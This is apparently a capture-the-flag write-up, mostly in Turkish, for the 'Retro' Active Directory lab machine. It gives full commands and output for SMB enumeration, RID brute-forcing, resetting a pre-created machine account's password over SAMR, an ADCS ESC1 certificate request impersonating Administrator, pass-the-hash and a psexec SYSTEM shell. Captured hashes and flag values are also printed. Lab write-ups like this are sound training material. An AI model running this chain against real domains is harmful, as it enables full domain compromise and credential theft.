#### About

`Retro` is an Easy Windows machine that showcases an Active Directory Domain Controller. Through SMB enumeration and pre-created machine account exploitation, we gain access to the system. Through the exploitation of the Active Directory Certificate Service and specifically by using the `ESC1` attack, which involves exploiting certificate templates to impersonate the Administrative user, privilege escalation is achieved.

---

## 1. Genel Bakış

Retro, ilk AD (Active Directory) kutumuz ve gerçekten güzel bir öğretici zincire sahip. Kısaca yol haritası şöyleydi:

1. SMB üzerinde açık paylaşımları (share) kurcaladım, bir not dosyasında zayıf/paylaşılan şifre ipucu buldum.
2. Bu ipucuyla bir domain kullanıcısına giriş yaptım, oradan başka bir not daha buldum — bu sefer "eski, önceden oluşturulmuş bir bilgisayar hesabı" ipucu.
3. Bu bilgisayar hesabının parolasını SAMR üzerinden yeniden belirleyebildim.
4. Bu hesapla AD Certificate Services'i (ADCS) taradım ve klasik bir **ESC1** zafiyeti buldum.
5. ESC1 ile Administrator kimliğini temsil eden bir sertifika çıkardım, bu sertifikayla domain admin hash'ini aldım ve makineye tam yetkiyle bağlandım.

---

## 2. Keşif

```bash
nmap -sS -A -T5 -p- 10.129.51.149
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-02 18:00:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-02T18:01:57+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-02T18:01:57+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-02T18:01:57+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
|_ssl-date: 2026-09-02T18:01:57+00:00; -1s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-02T18:01:57+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2026-09-01T17:55:08
|_Not valid after:  2027-03-03T17:55:08
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-02T18:01:18+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
58363/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58372/tcp open  msrpc         Microsoft Windows RPC
64576/tcp open  msrpc         Microsoft Windows RPC
64589/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Tarama sonucunda klasik bir Domain Controller port profili çıktı: 53 (DNS), 88 (Kerberos), 135/139/445 (RPC/SMB), 389/636/3268/3269 (LDAP), 3389 (RDP) ve birkaç yüksek numaralı RPC portu. SSL sertifikasından domainin **retro.vl**, makine adının da **DC** olduğunu gördüm.

Active Directory servisleri hostname ve FQDN çözümlemesine ihtiyaç duyabildiğinden, domain ve DC hostname bilgisini /etc/hosts dosyasına ekledim.

```
echo "10.129.51.149 retro.vl dc.retro.vl DC.retro.vl" >> /etc/hosts
```

AD kutularında ilk refleks her zaman SMB'ye bakmak oluyor, o yüzden oradan başladım.


## 3. SMB Enumeration — Açık Paylaşımlar

```bash
smbclient -L 10.129.51.149 -N
```

Null session ile paylaşım listesini çektim:

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Notes           Disk
SYSVOL          Disk      Logon server share
Trainees        Disk
```

`Notes` ve `Trainees` isimleri dikkatimi çekti — özel/varsayılan olmayan paylaşımlar genelde bir şey saklıyor olur. `Notes`'a bağlanmayı denedim ama erişim reddedildi:

```bash
smbclient //10.129.51.149/Notes -N
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

`Trainees`'e bağlandığımda ise içeride bir dosya vardı:

```bash
smbclient //10.129.51.149/Trainees -N
smb: \> get Important.txt
```

```
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards
The Admins
```

Bu notu okuyunca aklıma direkt şu geldi: **"herkes aynı ortak hesabı kullanıyor"** deniyor — yani muhtemelen basit, tahmin edilebilir bir kullanıcı adı/şifre kombinasyonu var. Bu tarz notlarda genelde kullanıcı adı ile şifre aynı ya da çok yakın oluyor, o yüzden önce en klasik ihtimali denemeye karar verdim.

---

## 4. Kullanıcı Keşfi ve İlk Giriş

Önce elimde kullanıcı isimleri yoktu, o yüzden anonim/guest oturumla `nxc`'nin RID brute-force özelliğini kullanarak domain kullanıcı listesini çıkardım:

```bash
nxc smb 10.129.51.149 -u guest -p '' --rid-brute
```

Bu bana bir sürü grup SID'i ile birlikte gerçek kullanıcı hesaplarını da verdi:

```
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
```

`trainee` ismini görünce, Important.txt'teki "hepinizi tek hesapta topladık" notunu hatırladım ve en basit tahmini denedim — kullanıcı adı ile aynı şifre:

```bash
nxc smb 10.129.51.149 -u trainee -p 'trainee'
```

```
SMB   10.129.51.149   445   DC   [+] retro.vl\trainee:trainee
```

Ve **çalıştı**. `trainee:trainee` ile domain'e authenticated bir kullanıcı olarak giriş yapmış oldum. Bu kimlikle paylaşımları tekrar listeledim:

```bash
nxc smb 10.129.51.149 -u trainee -p 'trainee' --shares
```

```
Share       Permissions   Remark
-----       -----------   ------
Notes       READ
Trainees    READ
```

Bu sefer `Notes` paylaşımına da `READ` yetkim vardı. Bağlandım:

```bash
smbclient //10.129.51.149/Notes -U 'trainee%trainee'
smb: \> get user.txt
smb: \> get ToDO.txt
```

`user.txt` doğrudan ilk flag'di:

```bash
cat user.txt
cbda362cff2099072c5e96c51712ff33
```

`ToDO.txt` ise bana bir sonraki ipucunu verdi:

```
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best
James
```

Bu not doğrudan **önceden oluşturulmuş (pre-created) bir bilgisayar hesabından** bahsediyor. RID brute-force'ta gördüğüm `BANKING$` hesabı da tam olarak bu profile uyuyordu — "banking" yazılımından kalma, eski, muhtemelen unutulmuş bir makine hesabı.

---

## 5. Pre-Created Computer Account İstismarı

AD'de önceden oluşturulmuş (pre-created) computer account'lar, özellikle uygun ACL/delegation koşulları mevcutsa, ilgili hesabın parolasının **yeniden belirlenmesine** olanak sağlayabilir. Bu, her pre-created hesabın otomatik olarak boş/şifresiz olduğu anlamına gelmez — önemli olan hesabın henüz gerçek bir makineye join edilmemiş, "askıda" bir durumda olması ve şifre sıfırlama işleminin bu haliyle mümkün olmasıdır.

Bunu doğrulamak için önce birkaç basit şifre denedim:

```bash
nxc smb dc.retro.vl -u 'BANKING$' -p banking
```

```
SMB   10.129.51.149   445   DC   [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` hatası, bunun bir kullanıcı değil bir **bilgisayar (trust) hesabı** olduğunu ve normal SMB login akışıyla doğrudan doğrulanamayacağını gösteriyordu. Bunun üzerine şifreyi kendim, SAMR protokolü üzerinden yeniden belirlemeyi denedim:

```bash
impacket-changepasswd -newpass 123456 'retro.vl/BANKING$:banking@dc.retro.vl' -protocol rpc-samr
```

```
[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```

`-protocol rpc-samr` eklememin sebebi, bilgisayar hesaplarında normal SMB tabanlı şifre değiştirmenin (`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` hatasıyla) başarısız olmasıydı — SAMR arayüzü üzerinden gönderdiğimde işlem sorunsuz tamamlandı. `BANKING$` hesabının parolasını `123456` olarak belirlemiş oldum. Doğruladım:

```bash
nxc smb dc.retro.vl -u 'BANKING$' -p '123456'
```

```
SMB   10.129.51.149   445   DC   [+] retro.vl\BANKING$:123456
```

Giriş başarılıydı. Artık elimde geçerli bir domain kimliği (bir bilgisayar/makine hesabı olsa da) vardı ve bu hesapla AD'nin daha derin servislerine bakabilirdim.

---

## 6. AD Certificate Services (ADCS) Taraması — ESC1

Elimde bir domain kimliği olduğu için, AD kutularında artık standart hale gelen bir kontrolü yaptım: **Certificate Services yanlış yapılandırması var mı?** Bunun için `certipy-ad`'nin `find -vulnerable` özelliğini kullandım:

```bash
certipy-ad find -u 'BANKING$@retro.vl' -p '123456' -vulnerable -stdout
```

Çıktıda bir sertifika şablonu (`RetroClients`) işaretlenmişti:

```
Certificate Templates
  Template Name                : RetroClients
  Client Authentication          : True
  Enrollee Supplies Subject     : True
  Extended Key Usage            : Client Authentication
  Enrollment Rights             : RETRO.VL\Domain Computers, RETRO.VL\Domain Admins, RETRO.VL\Enterprise Admins

  [!] Vulnerabilities
    ESC1 : Enrollee supplies subject and template allows client authentication.
```

Bu çıktının teknik karşılığı şuydu: enrollment yapan principal (yani sertifika talep eden taraf), sertifikanın subject/UPN gibi kimlik bilgilerini **kendisi sağlayabiliyordu** (Enrollee Supplies Subject) ve şablon, `Client Authentication` EKU'suna (Extended Key Usage) izin veriyordu. Bu iki özellik bir arada olduğunda, yetkili bir CA (Certificate Authority) tarafından imzalanan bu sertifika, **başka bir kullanıcıyı temsil eden geçerli bir kimlik doğrulama sertifikası** haline gelebiliyordu — CA, talep edilen kimliğin gerçekten talep eden kişiye ait olup olmadığını sorgulamıyordu.

Bunun istismar edilebilir olmasının ikinci şartı da **kimin bu şablona enroll (kayıt/talep) hakkı olduğuydu**. Çıktıda `Enrollment Rights` altında **`Domain Computers`** grubunun da yer aldığını gördüm — ve benim elimdeki `BANKING$` hesabı zaten bir bilgisayar hesabı olduğu için otomatik olarak bu gruba dahildi. Yani düşük yetkili, sıradan bir makine hesabıyla bile bu şablon üzerinden sertifika talep edebiliyordum. Bu iki koşulun (subject'i kendin belirleyebilme + geniş bir gruba açık enrollment) bir araya gelmesi, klasik **ESC1** senaryosunun tanımıdır.

---

## 7. ESC1 İstismarı — Administrator Kimliğini Temsil Eden Sertifika Talebi

`BANKING$` hesabımla, ama sertifikanın kimlik bilgilerini **Administrator**'a ait olacak şekilde belirterek bir talep gönderdim:

```bash
certipy-ad req -u 'BANKING$@retro.vl' -p '123456' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096 -dc-ip 10.129.51.149 -dc-host 'DC.retro.vl' -dynamic-endpoint
```

Burada `-upn` parametresinin yanında ayrıca **`-sid`** ile Administrator'ın gerçek SID'ini (`...-500`, well-known Administrator RID'i) de belirttim. Bunun sebebi, modern AD ortamlarında (özellikle Certipy'nin de dikkat çektiği, SID tabanlı güçlü eşleştirme zorunluluğu getiren güncellemelerden sonra) sertifika üzerindeki kimlik doğrulamasının yalnızca UPN alanına değil, sertifikanın **security extension/SAN** kısmına gömülen SID'e de bakarak yapılabilmesidir. UPN'i doğru versem bile SID eşleşmezse kimlik doğrulama reddedilebiliyordu; bu yüzden ikisini birlikte, tutarlı şekilde vermek gerekiyordu.

CA, şablonun izin verdiği şekilde talebimi hiç sorgulamadan onayladı:

```
[*] Got certificate with UPN 'administrator@retro.vl'
[+] Found SID in SAN URL: 'S-1-5-21-2983547755-698260136-4283918172-500'
[+] Found SID in security extension: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

Elimde artık Administrator kimliğini temsil eden, hem UPN hem de SID alanları doğru şekilde ayarlanmış, CA tarafından imzalanmış geçerli bir `.pfx` sertifikası vardı.

---

## 8. Sertifikadan Kerberos TGT ve NT Hash Elde Etme

Bu sertifikayı kullanarak doğrudan Administrator olarak Kerberos kimlik doğrulaması yapabiliyordum:

```bash
certipy-ad auth -pfx administrator_0a2b4f9d-311b-47b3-b168-9d8ebadd9551.pfx -dc-ip 10.129.51.149 -username administrator -domain retro.vl
```

Certipy hem bir Kerberos TGT (ticket) aldı hem de bonus olarak Administrator'ın **NT hash'ini** çözüp bana verdi:

```
[*] Trying to get TGT...
[*] Got TGT
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

Bu noktadan sonra artık gerçek şifreye ihtiyacım yoktu — elimde Administrator'ın NT hash'i vardı ve bunu doğrudan **pass-the-hash** ile kullanabilirdim.

---

## 9. Administrator Olarak Sisteme Erişim

Önce hash'in gerçekten geçerli ve yönetimsel erişim için kullanılabilir olduğunu `nxc` ile doğruladım:

```bash
nxc smb 10.129.51.149 -u Administrator -H '252fac7066d93dd009d4fd2cd0368389' -d retro.vl
```

```
SMB   10.129.51.149   445   DC   [+] retro.vl\Administrator:252fac7066d93dd009d4fd2cd0368389 (Pwn3d!)
```

`Pwn3d!` çıktısı, elde ettiğim Administrator hash'inin yalnızca kimlik doğrulama için değil, hedef üzerinde **uzaktan komut çalıştırma/yönetimsel erişim** için de kullanılabilir olduğunu gösteriyordu (`nxc`, bunu genelde `ADMIN$` paylaşımına yazma yetkisi olup olmadığını test ederek belirliyor). Bunun üzerine Pass-the-Hash ile `impacket-psexec` kullanarak gerçek bir shell aldım:

```bash
impacket-psexec -hashes ':252fac7066d93dd009d4fd2cd0368389' 'retro.vl/Administrator@10.129.51.149'
```

```
[*] Found writable share ADMIN$
[*] Uploading file GgbaucKF.exe
[*] Creating service ZeYx on 10.129.51.149.....
[*] Starting service ZeYx.....
Microsoft Windows [Version 10.0.20348.3453]

C:\Windows\system32>
```

`psexec`, hash'i kullanarak `ADMIN$` paylaşımına küçük bir servis binary'si yükledi, bunu bir Windows servisi olarak kaydedip başlattı ve bana bu servis üzerinden **SYSTEM yetkisinde** interaktif bir shell verdi. Artık Domain Controller üzerinde tam yetkiliydim.

---

## 10. Root Flag

```bash
C:\> type C:\Users\Administrator\Desktop\root.txt
40fce9c3f09024bcab29d377ee1ed071
```
